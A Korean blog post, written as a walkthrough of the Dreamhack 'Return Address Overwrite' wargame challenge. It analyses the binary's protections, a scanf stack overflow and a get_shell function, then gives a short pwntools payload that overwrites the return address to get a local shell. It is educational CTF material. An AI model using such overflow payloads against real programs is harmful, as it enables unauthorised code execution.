---
layout: post
title: 'Dreamhack-Return Address Overwrite 문제 풀이'
summary: Return Address Overwrite 문제 풀이
author: TouBVa
date: '2024-12-01 16:00:00 +09'
category: ['system_hacking']
thumbnail: /assets/img/posts/2024-12-01-Return-Address-Overwrite/Untitled.png
keywords: system_hacking
usemathjax: true
permalink: /blog/system_hacking/2024-12-01-Return-Address-Overwrite
---

* TOC
{:toc}

<br></br>


## 0. 메타데이터 분석

![/assets/img/posts/2024-12-01-Return-Address-Overwrite/Untitled.png](/assets/img/posts/2024-12-01-Return-Address-Overwrite/Untitled.png)

<br></br>

- ELF64
- little endian

![/assets/img/posts/2024-12-01-Return-Address-Overwrite/Untitled_1.png](/assets/img/posts/2024-12-01-Return-Address-Overwrite/Untitled_1.png)

<br></br>

- not stripped
- C언어 라이브러리

![/assets/img/posts/2024-12-01-Return-Address-Overwrite/Untitled_2.png](/assets/img/posts/2024-12-01-Return-Address-Overwrite/Untitled_2.png)

<br></br>

- NX enabled, but no canary & no PIE(코드 영역 고정으로 plt, got 고정)

—> 가능한 익스플로잇은 Return Address Overwrite나 ROP 정도일 것

<br></br>

## 1. 행위 분석

<br></br>

![/assets/img/posts/2024-12-01-Return-Address-Overwrite/Untitled_3.png](/assets/img/posts/2024-12-01-Return-Address-Overwrite/Untitled_3.png)

<br></br>

단순하게 Input: 을 출력하고 사용자 입력값을 받은 후 종료하는 프로그램

해당 프로그램에 어떤 취약점이 존재하는지 파악해 보자.

<br></br>

## 2. 정적 분석

<br></br>

내부에 어떤 함수가 있는지부터 파악해 보자.

![/assets/img/posts/2024-12-01-Return-Address-Overwrite/Untitled_4.png](/assets/img/posts/2024-12-01-Return-Address-Overwrite/Untitled_4.png)

<br></br>

main 함수가 존재하고, get_shell 함수가 존재한다. 두 함수를 요주의 함수로 두고 접근하자.

<br></br>

### 2.1. alias 자동 설정 스크립트

<br></br>

disassemble을 disas로 alias 설정을 하고 싶은데, 터미널을 실행할 때마다 alias를 새로 실행해야 해서 귀찮았다. 따라서 pwndbg의 스크립트를 아래와 같이 수정해 pwndbg가 실행될 때마다 disas가 disassemble로 설정되도록 했다.

```python
# Force UTF-8 encoding (to_string=True to skip output appearing to the user)command='''set charset UTF-8alias disas=disassemble'''gdb.execute(command, to_string=True)
```
<br></br>

### 2.2. main 함수 분석

<br></br>

![/assets/img/posts/2024-12-01-Return-Address-Overwrite/Untitled_5.png](/assets/img/posts/2024-12-01-Return-Address-Overwrite/Untitled_5.png)

<br></br>

1. 내부에서 get_shell을 호출하는 부분은 없다
2. main함수의 지역 변수는 1개로, 0x30짜리 크기를 가졌음(이하 buf)
3. scanf(”%s”, buf)

scanf 함수는 길이 제한 없이 사용자 입력값을 받는 취약점이 있으므로 이를 활용할 수 있어 보인다.

<br></br>

### 2.3. get_shell 함수 분석

<br></br>

![/assets/img/posts/2024-12-01-Return-Address-Overwrite/Untitled_6.png](/assets/img/posts/2024-12-01-Return-Address-Overwrite/Untitled_6.png)



![/assets/img/posts/2024-12-01-Return-Address-Overwrite/Untitled_7.png](/assets/img/posts/2024-12-01-Return-Address-Overwrite/Untitled_7.png)



1. 0x4006aa가 해당 함수의 시작 주소
2. `execve(”/bin/sh”, *(rbp-0x8)*(/bin/sh문자열의 주소)*, 0)`를 실행하는 함수

<br></br>

## 3. 페이로드 작성

<br></br>

0x30 bytes dump + 0x08 bytes rbp dump + 0x00000000004006aa

```python
from pwn import *p=process("./rao")
payload=b'A'*0x30payload+=b'B'*0x08payload+=p64(0x4006aa, endian='little')
print(hexdump(payload))
p.sendline(payload)
p.interactive()
```

<br></br>

![/assets/img/posts/2024-12-01-Return-Address-Overwrite/Untitled_8.png](/assets/img/posts/2024-12-01-Return-Address-Overwrite/Untitled_8.png)

<br></br>

Return Address Overwrite를 통해 쉘을 딸 수 있었다.

이제 원격 호스트에 대해 실행은 생략한다(이미 푼 문제라 플래그 입력이 안 된다)